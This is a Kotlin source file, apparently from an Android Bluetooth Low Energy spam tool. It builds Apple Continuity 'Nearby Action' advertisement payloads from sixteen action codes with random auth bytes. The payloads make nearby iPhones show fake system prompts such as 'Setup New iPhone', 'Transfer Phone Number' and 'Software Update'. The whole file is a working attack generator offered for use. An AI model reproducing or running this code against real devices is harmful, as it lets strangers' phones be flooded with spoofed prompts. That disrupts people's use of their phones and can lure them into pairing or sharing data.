package com.nlespam.generators

import com.nlespam.helpers.HexUtils
import com.nlespam.models.*
import kotlin.random.Random

class AppleActionModalGenerator : SpamGenerator {
    override val name = "Apple Action Modals"

    val nearbyActions = mapOf(
        "13" to "AppleTV AutoFill",
        "27" to "AppleTV Connecting...",
        "20" to "Join This AppleTV?",
        "19" to "AppleTV Audio Sync",
        "1E" to "AppleTV Color Balance",
        "09" to "Setup New iPhone",
        "02" to "Transfer Phone Number",
        "0B" to "HomePod Setup",
        "01" to "Setup New AppleTV",
        "06" to "Pair AppleTV",
        "0D" to "HomeKit AppleTV Setup",
        "2B" to "AppleID for AppleTV?",
        "05" to "Apple Watch",
        "24" to "Apple Vision Pro",
        "2F" to "Connect to other Device",
        "21" to "Software Update",
    )

    override fun generate(): List<AdvertisementSet> = nearbyActions.map { (actionHex, actionName) ->
        val continuityType = "0F"
        val payloadSize = "05"
        val flag = "C0"
        val authTag = Random.nextBytes(3)

        val payload = HexUtils.decodeHex(continuityType + payloadSize + flag + actionHex) + authTag

        AdvertisementSet(
            title = actionName,
            target = AdvertisementTarget.IOS,
            type = SpamType.APPLE_ACTION_MODAL,
            manufacturerData = ManufacturerData(ManufacturerIds.APPLE, payload),
        )
    }
}
